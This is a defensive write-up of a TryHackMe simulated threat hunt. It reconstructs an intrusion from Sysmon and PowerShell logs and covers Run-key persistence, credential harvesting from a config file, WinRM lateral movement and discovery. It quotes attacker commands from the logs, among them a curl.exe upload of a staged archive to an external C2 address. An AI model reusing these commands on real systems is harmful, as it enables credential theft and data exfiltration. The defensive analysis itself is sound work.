
# Threat Hunting Investigation: Quiet as the Grave

**Platform:** TryHackMe Threat Hunting Simulator  
**Investigation:** Quiet as the Grave  
**Environment:** Simulated TryHatMe Studios enterprise network  
**Classification:** Confirmed Multi-Stage Intrusion  
**Difficulty:** Hard  
**Outcome:** Investigation Successful  
**Assessment Score:** 1,020 / 1,100 (92.7%)  
**TryHackMe Challenge:** [Quiet as the Grave](https://tryhackme.com/threat-hunting-sim/public-summary/a2124533514501ec82cb06dfdc9bf2502aa576af7877bb0b3a9e2667df2b77ad668456481f36eceaae37cc0a800aafa5))

## 1. Executive Summary

This case study documents a threat hunting investigation into a multi-stage intrusion targeting TryHatMe Studios and its unreleased NeuralNexus project.

The investigation reconstructed an attack beginning with the execution of a malicious PowerShell review helper on a developer workstation. The attacker established Registry-based persistence, accessed a configuration file containing credential fields, reused the `svc-studioops` account for remote access, and moved through multiple Windows endpoints using Windows Remote Management (WinRM).

Subsequent activity included attempts to access IT support inventory, a domain controller, and Marketing release materials. The intrusion culminated in PowerShell commands designed to stage and compress project files, followed by a `curl.exe` command intended to upload the resulting archive to an external command-and-control (C2) destination.

**Key conclusion:** Malicious execution, persistence, remote authentication, lateral movement, discovery, and an attempted exfiltration command were established through log evidence. Successful transfer of the archive to the external destination was not independently confirmed.

## 2. Investigation Objectives

The investigation focused on five questions:

1. Was suspicious activity consistent with the threat hunting hypothesis present?
2. How did the initial malicious execution and persistence occur?
3. Were credentials accessed and subsequently used for lateral movement?
4. Which hosts, accounts, and sensitive directories were targeted?
5. Was there evidence of data collection or attempted exfiltration?

## 3. Tools and Evidence Sources

| Source | Investigative purpose |
|---|---|
| Splunk Search & Reporting | SIEM searches, event filtering, timeline reconstruction |
| Sysmon Event ID 1 | Process creation and parent-child relationships |
| Sysmon Event ID 3 | Network connections and C2 correlation |
| Sysmon Event ID 13 | Registry persistence modifications |
| Windows Security Event ID 4624 | Successful remote logons |
| Windows Security Event ID 4648 | Authentication using explicit credentials |
| PowerShell Event ID 4104 | Script block execution evidence |
| PowerShell Event ID 4100 | PowerShell operational errors |
| MITRE ATT&CK | Classification of observed adversary behavior |

All investigated activity occurred in an authorized, simulated training environment.

## 4. Investigation Methodology

The investigation followed an evidence-driven approach:

1. Identify the initial suspicious process and associated network activity.
2. Correlate process identifiers, process GUIDs, parent processes, user accounts, and timestamps.
3. Examine persistence-related Registry changes and subsequent process execution.
4. Investigate credential access through PowerShell script block logs.
5. Trace remote authentication and command execution across affected Windows hosts.
6. Correlate discovery, collection, archive preparation, and attempted exfiltration.
7. Map the reconstructed activity to MITRE ATT&CK tactics and techniques.
8. Distinguish directly observed actions from outcomes not established by the available telemetry.

Events were evaluated using UTC timestamps.

## 5. Reconstructed Attack Timeline

**Date: September 10, 2026 (UTC)**

| Time | Host | Activity | MITRE ATT&CK |
|---|---|---|---|
| 12:29:48 | THM-SREYES | Initial malicious PowerShell helper execution | T1059 |
| 12:37:20 | THM-SREYES | Registry Run key persistence modification | T1547 |
| 12:44:04 | THM-SREYES | Persisted helper relaunched from AppData | T1547 |
| 13:01:41 | THM-SREYES | PowerShell accessed deployment configuration credential fields | T1552 |
| 13:16:42 | THM-LSULLIVAN | WinRM authentication and remote execution using `svc-studioops` | T1021 |
| 13:36:43 | THM-SREYES | Remote PowerShell commands targeted IT support inventory files | T1021 |
| 13:48:25 | DC-01 | Attempted WinRM lateral movement and network authentication | T1021 |
| 15:03:37 | THM-MSMITH | WinRM lateral movement and Marketing directory enumeration | T1021 |
| 16:03:38 | THM-MSMITH | Local user, administrator group, and share discovery | T1069 |
| 16:27:01 | THM-SREYES | Commands to collect and stage Marketing and project files | T1560 |
| 16:27:28 | THM-SREYES | PowerShell archive preparation using `Compress-Archive` | T1560 |
| 16:27:54 | THM-SREYES | `curl.exe` executed with an archive-upload command | T1041 |

The simulator assessed nine attack stages. Additional timestamps are included above to distinguish individual supporting events.

## 6. Technical Findings

### Finding 1: Malicious PowerShell Execution and C2

At 12:29:48 UTC, `explorer.exe` launched a PowerShell script from the developer's Downloads directory:

```powershell
powershell.exe -NoProfile -File "C:\Users\s.reyes\Downloads\NeuralNexusReview\review-helper.ps1"
```

Sysmon Event ID 1 identified the process as PID `12412`, with ProcessGuid:

`{3af46175-a2bc-6aa2-2f19-000000001100}`

At approximately 12:29:51 UTC, Sysmon Event ID 3 recorded outbound communication by the same PowerShell process to:

`45.147.230.131:8443`

Correlating the process GUID across process-creation and network telemetry connected the initial execution to the external C2 infrastructure.

**Evidence limitation:** The original delivery mechanism and the contents of the outbound traffic were not established.

### Finding 2: Registry-Based Persistence

At 12:37:20 UTC, Sysmon Event ID 13 recorded the creation or modification of the `NeuralNexusReview` Registry Run value.

**Persistence location:**

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NeuralNexusReview
```

**Configured command:**

```powershell
powershell.exe -NoProfile -File "C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1"
```

At 12:44:04 UTC, `explorer.exe` launched a new PowerShell process executing the script from the AppData path. This occurred in a different logon session and provides evidence of the persistence mechanism being activated.

The relaunched PowerShell process was subsequently associated with further C2 activity.

### Finding 3: Credential Access Through a Configuration File

At 13:01:41 UTC, PowerShell Event ID 4104 recorded a script block referencing:

```text
C:\StudioProjects\NeuralNexus\tools\deploy-settings.json
```

The script attempted to load configuration data and construct a credential object:

```powershell
$cfg = Get-Content -Raw -LiteralPath C:\StudioProjects\NeuralNexus\tools\deploy-settings.json | ConvertFrom-Json
$cred = [pscredential]::new($cfg.username, (ConvertTo-SecureString $cfg.password -AsPlainText -Force))
```

Subsequent WinRM activity under `svc-studioops` supports a connection between the credential-access activity and later lateral movement.

**Evidence limitation:** The script-block record did not expose the configuration values or independently confirm the result of the file read.

### Finding 4: Lateral Movement to IT Workstation

At 13:16:42 UTC, Windows Security Event ID 4624 recorded successful Kerberos network authentication to `THM-LSULLIVAN` using `svc-studioops`.

Sysmon Event ID 1 subsequently recorded remote command execution through `wsmprovhost.exe`:

```cmd
cmd.exe /c dir C:\ProgramData\StudioOps
```

At 13:36:43 UTC, PowerShell Event ID 4104 on the initiating workstation recorded remote commands targeting:

```text
C:\ProgramData\StudioOps\endpoint-list.csv
C:\ProgramData\StudioOps\maintenance-runbook.txt
```

The commands were executed through an `Invoke-Command -Session $it` script block.

**Evidence limitation:** The recorded commands establish access attempts, but the returned file contents were not captured.

### Finding 5: Domain Controller Access Attempt

At 13:48:25 UTC, Windows Security Event ID 4648 on `THM-LSULLIVAN` showed `wsmprovhost.exe` supplying explicit credentials to `HTTP/DC-01`.

Event ID 4624 on `DC-01` recorded successful Kerberos network authentication.

However, the investigation did not establish corresponding remote command execution on the domain controller.

**Assessment:** Attempted lateral movement with successful network authentication, but no verified remote execution or full domain controller compromise.

### Finding 6: Lateral Movement to Marketing Workstation

At 15:03:37 UTC, the attacker used `svc-studioops` credentials to access `THM-MSMITH` from `THM-LSULLIVAN`.

Authentication evidence was supported by process execution on the destination host, including:

```cmd
cmd.exe /c dir C:\StudioMarketing\approved-release
```

The `cmd.exe` process was launched beneath `wsmprovhost.exe`, confirming remote command execution against the Marketing workstation.

### Finding 7: Post-Compromise Discovery

At 16:03:38 UTC, Sysmon Event ID 1 recorded Windows discovery commands on `THM-MSMITH`:

```cmd
net user
net localgroup Administrators
net share
```

These commands are associated with local account enumeration, permission group discovery, and network share discovery.

A directly verified process chain included:

```text
wsmprovhost.exe
  └── net.exe localgroup Administrators
       └── net1.exe localgroup Administrators
```

The `net.exe` and `net1.exe` events occurred under `TRYHATME\svc-studioops`.

**Evidence limitation:** Command execution was confirmed, but the returned account lists, group memberships, and share listings were not available in the captured telemetry.

### Finding 8: Collection and Archive Preparation

At 16:27:01 UTC, PowerShell Event ID 4104 recorded commands intended to stage files from two sources:

**Marketing release materials:**

```text
C:\StudioMarketing\approved-release\
```

**NeuralNexus project materials:**

```text
C:\StudioProjects\NeuralNexus\release-notes
```

The commands targeted local staging directories beneath:

```text
$env:TEMP\review-staging\
```

At 16:27:28 UTC, another PowerShell script block recorded:

```powershell
Compress-Archive -Path "$env:TEMP\review-staging\*" -DestinationPath "$env:TEMP\review-cache.zip"
```

**Evidence limitation:** Script block telemetry established the intended collection and compression operations but did not independently verify that all copies completed or that the ZIP archive was successfully created.

### Finding 9: Attempted HTTPS Exfiltration

At 16:27:54.338 UTC, Sysmon Event ID 1 recorded `curl.exe` executing beneath the persisted PowerShell process, PID `5020`.

The command included:

```cmd
curl.exe --fail --show-error --insecure --upload-file C:\Users\S460E~1.REY\AppData\Local\Temp\review-cache.zip https://45.147.230.131:8443/ingest/review-cache.zip
```

This links the earlier archive-preparation activity to an attempted outbound upload over the established C2 infrastructure.

**Assessment:** An exfiltration attempt was confirmed through process-creation evidence. Successful transmission and remote receipt were not independently established.

## 7. Indicators of Compromise

### Network Indicators

| Indicator | Context |
|---|---|
| `45.147.230.131` | External C2 and attempted exfiltration destination |
| `TCP/8443` | Observed C2 connection port |
| `https://45.147.230.131:8443/ingest/review-cache.zip` | Attempted archive-upload endpoint |

### Host Indicators

| Indicator | Context |
|---|---|
| `C:\Users\s.reyes\Downloads\NeuralNexusReview\review-helper.ps1` | Initial malicious helper |
| `C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1` | Persistence payload path |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NeuralNexusReview` | Registry persistence |
| `C:\StudioProjects\NeuralNexus\tools\deploy-settings.json` | Credential configuration |
| `C:\ProgramData\StudioOps\endpoint-list.csv` | Targeted support inventory |
| `C:\StudioMarketing\approved-release` | Targeted Marketing directory |
| `$env:TEMP\review-staging\` | Collection staging path |
| `$env:TEMP\review-cache.zip` | Intended archive output |
| `C:\Users\S460E~1.REY\AppData\Local\Temp\review-cache.zip` | Archive path supplied to `curl.exe` |

**Account of interest:** `svc-studioops`

**Primary affected endpoints:** `THM-SREYES`, `THM-LSULLIVAN`, `THM-MSMITH`

**Additional targeted system:** `DC-01`

## 8. Detection Opportunities

The investigation highlights several opportunities for defensive monitoring:

- **PowerShell execution:** Detect scripts launched from user-controlled Downloads directories and correlate them with unusual external connections.
- **Registry persistence:** Monitor changes to user Run keys, particularly when values launch PowerShell scripts from AppData.
- **Credential exposure:** Alert on suspicious PowerShell activity reading configuration files containing credential fields.
- **WinRM activity:** Correlate remote logons, explicit credential use, and `wsmprovhost.exe` child processes.
- **Post-compromise discovery:** Detect suspicious execution of `net user`, `net localgroup Administrators`, and `net share` in remote administrative sessions.
- **Archive preparation:** Investigate unusual staging directories and compression commands targeting sensitive project locations.
- **Potential exfiltration:** Detect `curl.exe --upload-file` execution to uncommon external destinations, especially from PowerShell parent processes.

High-confidence detection opportunities emerge from combinations of events, not from relying on any single command in isolation.

## 9. Recommended Response Actions

1. Isolate and investigate the affected endpoints while preserving relevant forensic evidence.
2. Block the identified C2 destination and review historical network communications.
3. Revoke or rotate exposed `svc-studioops` credentials and review the account's privileges.
4. Remove the malicious Run key and persisted script after appropriate evidence collection.
5. Review WinRM permissions and restrict unnecessary remote administrative access.
6. Determine whether the targeted project and Marketing files were actually accessed, copied, or transmitted.
7. Examine available endpoint, proxy, firewall, and server-side telemetry for evidence of a completed archive upload.
8. Review secrets management practices to prevent plaintext credentials being stored in application configuration files.

## 10. Investigation Outcome

The TryHackMe Threat Hunting Simulator assessment concluded that the hypothesis was proven.

| Assessment measure | Result |
|---|---|
| Investigation outcome | Successful |
| Score | 1,020 / 1,100 |
| Attack stages reconstructed | 9 |
| Tactic and technique identification | 94% |
| Compromised assets identified | 100% |
| Indicators of compromise identified | 100% |

The investigation reconstructed the progression from initial execution through attempted exfiltration, correlating evidence across Sysmon, Windows Security and PowerShell operational logs.

The main remaining investigative uncertainty concerns the results of certain commands, particularly file retrieval, archive creation, and external upload completion.

## 11. Lessons Learned

The most important analytical lesson was the value of correlating process creation, authentication, Registry, and script block events into a single chronological narrative.

A successful network logon does not necessarily establish successful remote command execution. Similarly, an archive command or upload command does not alone prove that a file was created or transferred.

Separating those distinctions improved the accuracy of the final attack chain and resulted in a more defensible investigation report.

---

*This case study documents an authorized cybersecurity training investigation. Hostnames, accounts, artifacts, and network indicators originate from the simulated environment and are provided for educational and detection-engineering purposes.*
